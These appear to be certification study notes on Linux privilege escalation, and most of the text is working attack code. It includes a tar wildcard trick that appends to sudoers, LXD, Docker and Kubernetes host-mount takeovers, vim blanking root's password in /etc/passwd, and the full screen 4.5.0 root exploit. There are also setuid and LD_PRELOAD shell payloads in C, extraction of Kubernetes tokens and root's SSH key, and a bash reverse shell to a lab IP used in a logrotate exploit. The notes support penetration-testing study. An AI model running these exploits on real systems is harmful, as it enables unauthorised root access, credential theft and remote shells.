---
title: "Linux Privilege Escalation"
date: 2026-03-31 10:14:00 +0000
categories: [Certifications Technical Notes, Certified Penetration Testing Specialist (CPTS)]
tags: [offensive security, privilege escalation]
---

## Information Gathering

### Environment Enumeration

- Check OS version
```bash
    cat /etc/os-release
```

- Check kernel version
```bash
    uname -a
    cat /proc/version
```

- Host information
```bash
    lscpu
```

- Check login shells
```bash
    cat /etc/shells
```

- Enumerate existing defenses: `Exec Shield`, `iptables`, `AppArmor`, `SELinux`, `Fail2ban`, `Snort`, `UFW`
- Check `/etc/fstab` for mounted drives for secrets
- Enumerate shells (Bash 4.1 vulnerable to Shellshock exploit)
- Check `/etc/group` for group names and assigned users
```bash
    cat /etc/group
    getent group sudo
```

- Check routing table and ARP table
```bash
    # route table
    route
    netstat -rn
    # arp table (history of communication with the host)
    arp -a
```

- Check mounted/unmounted filesystems
```bash
    # mounted
    df -h
    # unmounted
    cat /etc/fstab | grep -v "#" | column -t
```

- Locate all hidden files/directories
```bash
    # files owned by a specific user
    find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep websrv
    # directories
    find / -type d -name ".*" -ls 2>/dev/null
```

- List temporary files
```bash
    ls -l /tmp /var/tmp /dev/shm
    # /tmp (max 10 days), /var/tmp (max 30 days)
```

- Crontab & bash scripts
```bash
    ls -la /etc/cron.daily/
```

---

### Linux Services & Internals Enumeration

#### Internals

```bash
    ip a                    # Network interfaces
    cat /etc/hosts          # Hosts
    cat /etc/resolv.conf    # DNS configuration
    lastlog                 # User's last login
    w                       # Logged in users
```

- Finding history files
```bash
    find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

- Proc filesystem
```bash
    find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

#### Services

- Installed packages
```bash
    apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

- Sudo version
```bash
    sudo -v
```

- All binaries
```bash
    ls -l /bin /usr/bin/ /usr/sbin/
```

- Trace system calls
```bash
    strace ping -c1 10.10.5.5
```

- Configuration files
```bash
    find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

- Scripts
```bash
    find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

- Services ran by root
```bash
    ps aux | grep root
```

---

### Credential Hunting

```bash
    # WordPress config
    grep 'DB_USER\|DB_PASSWORD' wp-config.php
    # All config files
    find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

---

## Environment-based Privilege Escalation

### Path Abuse

```bash
    PATH=.:${PATH}
    export PATH
    echo $PATH
    # Create a malicious LS command
    touch ls
    echo 'echo "PATH ABUSE!!"' > ls
    chmod +x ls
```

---

### Wildcard Abuse

- Add our user to sudoers file and abuse TAR EXEC
```bash
    echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
    echo "" > "--checkpoint-action=exec=sh root.sh"
    echo "" > --checkpoint=1
```

---

### Escaping Restricted Shells

- Restricted shells: RBASH, RKSH and RZSH
- Command injection example:
```bash
    ls -l `pwd`
```
> Techniques: [Bypass Restricted Shell](https://vk9-sec.com/linux-restricted-shell-bypass/)

---

## Permission-based Privilege Escalation

### Special Permissions

- SUID enumeration
```bash
    find / -user srvadm -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

- SGID enumeration
```bash
    find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

---

### Sudo Rights Abuse

- Abuse `tcpdump` with sudo
```bash
    sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

---

### Privileged Groups

#### LXC / LXD

- Abuse membership to LXD (similar to Docker, Ubuntu's container manager)
    
    1. Confirm membership
```bash
    id
```
    2. Unzip alpine image
```bash
    unzip alpine.zip
```
    3. Start lxd init
```bash
    lxd init
```
    4. Import the local image
```bash
    lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
    5. Start a privileged container
```bash
    lxc init alpine r00t -c security.privileged=true
```
    6. Mount the host file system
```bash
    lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
    7. Spawn a shell and access the host filesystem as root
```bash
    lxc start r00t
    lxc exec r00t /bin/sh
```

#### Docker

- Once a user is a member of the Docker group, they can spawn new containers and mount sensitive directories
```bash
    # mount /root
    docker run -v /root:/mnt -it ubuntu
    # mount /etc
    docker run -v /etc:/mnt -it ubuntu
```

#### Disk

- An attacker with disk group membership can access the entire system with root privileges using `debugfs` as they have full access on devices within `/dev` (e.g., `/dev/sda1`)

#### ADM

- ADM group members are able to read all logs stored in `/var/logs`

---

### Capabilities

- Set capabilities
```bash
    sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

- Types of capabilities

    | **Capability** | **Description** |
    | --- | --- |
    | `cap_sys_admin` | Perform actions with administrative privileges |
    | `cap_sys_chroot` | Change the root directory for the current process |
    | `cap_sys_ptrace` | Attach to and debug other processes |
    | `cap_sys_nice` | Raise or lower the priority of processes |
    | `cap_sys_time` | Modify the system clock |
    | `cap_sys_resource` | Modify system resource limits |
    | `cap_sys_module` | Load and unload kernel modules |
    | `cap_net_bind_service` | Bind to network ports |

- Capability values

    | **Value** | **Description** |
    | --- | --- |
    | `=` | Sets the capability but does not grant any privileges |
    | `+ep` | Grants effective and permitted privileges |
    | `+ei` | Grants sufficient and inheritable privileges |
    | `+p` | Grants only permitted privileges |

- Capabilities that can lead to root

    | **Capability** | **Description** |
    | --- | --- |
    | `cap_setuid` | Set effective user ID (gain root privileges) |
    | `cap_setgid` | Set effective group ID (gain root group) |
    | `cap_sys_admin` | Broad admin privileges (mount filesystems, modify settings) |
    | `cap_dac_override` | Bypass file read, write, and execute permission checks |

- Capabilities enumeration
```bash
    find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
    # for single binary
    getcap /usr/bin/vim.basic
    # abuse vim.basic to remove password from root
    echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

---

## Service-based Privilege Escalation

### Vulnerable Services

#### Screen v4.5.0 Local Root Exploit

```bash
    # check screen version
    screen -v
```

- Exploit POC (screenroot.sh)
```bash
    #!/bin/bash
    # screenroot.sh
    # setuid screen v4.5.0 local root exploit
    # abuses ld.so.preload overwriting to get root.
    echo "~ gnu/screenroot ~"
    echo "[+] First, we create our shell and library..."
    cat << EOF > /tmp/libhax.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/stat.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/tmp/rootshell", 0, 0);
        chmod("/tmp/rootshell", 04755);
        unlink("/etc/ld.so.preload");
        printf("[+] done!\n");
    }
    EOF
    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
    rm -f /tmp/libhax.c
    cat << EOF > /tmp/rootshell.c
    #include <stdio.h>
    int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
    }
    EOF
    gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
    rm -f /tmp/rootshell.c
    echo "[+] Now we create our /etc/ld.so.preload file..."
    cd /etc
    umask 000
    screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
    echo "[+] Triggering..."
    screen -ls
    /tmp/rootshell
```

---

### Cron Job Abuse

- Crontab command creates a cron file in `/var/spool/cron`
- Example entry: `0 */12 * * * /home/admin/backup.sh` runs every 12 hours

- Enumerate writable files and directories
```bash
    find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

- Use pspy to view running processes
```bash
    # -pf to print commands and file system events
    # -i 1000 to scan procfs every 1sec
    ./pspy64 -pf -i 1000
```

---

### Linux Containers (LXD)

> Condition: must be in the LXD group.

1. Import the image
```bash
    lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

2. Verification
```bash
    lxc image list
```

3. Configure the container
```bash
    lxc init ubuntutemp privesc -c security.privileged=true
    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

4. Start the container and log into it
```bash
    lxc start privesc
    lxc exec privesc /bin/bash
```

---

### Docker

- When accessing a Docker container, enumerate locally for config/private files (SSH keys, bash scripts, etc.)
- Abusing Docker Sockets (normally in `/var/run/docker.sock`)

1. Download a Docker binary
```bash
    wget http://localmachine/docker -o docker
    chmod +x docker
```

2. Enumerate Docker containers
```bash
    /tmp/docker -H unix://app/docker.sock ps
```

3. Map the host's root directory
```bash
    /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
    # verification
    /tmp/docker -H unix:///app/docker.sock ps
    # get shell as root to the host
    /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

4. Shell as root on host using an existing container
```bash
    docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

---

### Kubernetes

- Control plane (master node) services

    | **Service** | **TCP Ports** |
    | --- | --- |
    | `etcd` | `2379`, `2380` |
    | `API server` | `6443` |
    | `Scheduler` | `10251` |
    | `Controller Manager` | `10252` |
    | `Kubelet API` | `10250` |
    | `Read-Only Kubelet API` | `10255` |

- K8s API server interaction
```bash
    curl http://ip:6443 -k
```

- Kubelet API - Extracting Pods
```bash
    curl https://10.129.10.11:10250/pods -k | jq .
```

- Using Kubeletctl
```bash
    # Extract Pods
    kubeletctl -i --server 10.129.10.11 pods
    # List available nodes with pods vulnerable to RCE
    kubeletctl -i --server 10.129.10.11 scan rce
    # Executing commands
    kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
    # Extracting tokens
    kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
    # Extracting certificates
    kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

#### Privilege Escalation via Pod Creation

- Enumerate the cluster for privileges
```bash
    export token=`cat k8.token`
    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

- Abuse `create` verb on pods to mount the entire root filesystem
```yaml
    # new-pod.yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: privesc
      namespace: default
    spec:
      containers:
      - name: privesc
        image: nginx:1.14.2
        volumeMounts:
        - mountPath: /root
          name: mount-root-into-mnt
      volumes:
      - name: mount-root-into-mnt
        hostPath:
           path: /
      automountServiceAccountToken: true
      hostNetwork: true
```

- Create the new pod
```bash
    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f new-pod.yaml
    # list pods
    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

- Grab root's private SSH key from the pod
```bash
    kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

---

### Logrotate

- Exploitation requirements:
    1. `write` permissions on the log files
    2. logrotate must run as a privileged user or `root`
    3. Vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0

- logrotten exploit ([source](https://github.com/whotwagner/logrotten))

1. Setup
```bash
    git clone https://github.com/whotwagner/logrotten.git
    cd logrotten
    gcc logrotten.c -o logrotten
```

2. Prepare the payload
```bash
    echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

3. Determine which option logrotate uses
```bash
    grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

4. Start the `nc` listener

5. Run the exploit
```bash
    ./logrotten -p ./payload /tmp/tmp.log
    # with compress
    ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
    # other working method
    echo test >> ../access.log; ./logrotten ../access.log -p payload
```

---

### Miscellaneous Techniques

- **Passive Traffic Capture**: PCredz and net-creds

#### Weak NFS Privileges

- List NFS server export list
```bash
    showmount -e 10.129.3.37
```

- NFS volume creation options

    | **Option** | **Description** |
    | --- | --- |
    | `root_squash` | Root user accessing NFS shares is changed to `nfsnobody` (unprivileged). Prevents SUID bit abuse. |
    | `no_root_squash` | Remote root users can create files as root on the NFS server. Allows creation of SUID binaries. |

- Abuse SETUID binary

1. Create a simple `/bin/sh` binary
```c
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <stdlib.h>

    int main(void)
    {
      setuid(0); setgid(0); system("/bin/bash");
    }
```

2. Compile and deploy
```bash
    gcc shell.c -o shell
    sudo mount -t nfs 10.129.2.12:/tmp /mnt
    cp shell /mnt
    chmod u+s /mnt/shell
```

3. Switch back to the low privileged session and execute the binary to obtain root

- **Hijack Tmux Sessions**: Check for running Tmux sessions then attach to root's session

---

## Linux Internals-based Privilege Escalation

### Kernel Exploits

```bash
    uname -a             # Check kernel version
    cat /etc/lsb-release  # Check OS version
```

---

### Shared Libraries

> Condition: `env_keep+=LD_PRELOAD` must exist in `sudo -l` output.

- Prepare custom preloaded library
```c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>

    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }
```

- Compilation
```bash
    gcc -fPIC -shared -o root.so root.c -nostartfiles
```

- Execute the binary with the custom library
```bash
    sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

---

### Shared Object Hijacking

- Enumerate the shared object using `ldd` or `readelf`
```bash
    readelf -d payroll | grep PATH
```

- Detect the needed function name
```bash
    # Replace the library following its path with another library and inspect the error
    cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
    # re-execution of binary causes this error (function name: dbquery)
    ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

- Build the payload
```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<unistd.h>

    void dbquery() {
        printf("Malicious library loaded\n");
        setuid(0);
        system("/bin/sh -p");
    }
```

- Compilation
```bash
    gcc src.c -fPIC -shared -o /development/libshared.so
```

---

### Python Library Hijacking

- Privilege escalation using `PYTHONPATH` environment variable
```bash
    sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

- If `/usr/lib/python3.8` is misconfigured (writable), we can write our own libraries to hijack those used in the targeted script
```bash
    # Confirm the path of a Python package
    pip3 show psutil
```
> List the writable files for the current user and then the function used in the target script to embed the malicious code for privilege escalation.

---

## Recent 0-Days

### Sudo Vulnerabilities

- **CVE-2021-3156**: Heap-based buffer overflow affecting sudo versions:
    - 1.8.31 (Ubuntu 20.04)
    - 1.8.27 (Debian 10)
    - 1.9.2 (Fedora 33)

- **CVE-2019-14287**: Bypass restriction in sudoers file (all versions below `1.8.28`)
```bash
    sudo -u#-1 id
```

---

### Polkit (CVE-2021-4034)

```bash
    pkexec -u root id
    # Exploit
    git clone https://github.com/arthepsy/CVE-2021-4034.git
    cd CVE-2021-4034
    gcc cve-2021-4034-poc.c -o poc
    ./poc
```

---

### Dirty Pipe (CVE-2022-0847)

- Similar to Dirty Cow (2016). All kernels from version `5.8` to `5.17` are affected.
```bash
    git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
    cd CVE-2022-0847-DirtyPipe-Exploits
    bash compile.sh
```

- `exploit-1`: Removes root password
- `exploit-2`: Abuses SUID binaries
```bash
    find / -perm -4000 2>/dev/null
```

---

### Netfilter

- Vulnerabilities found in 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)) that could lead to privilege escalation.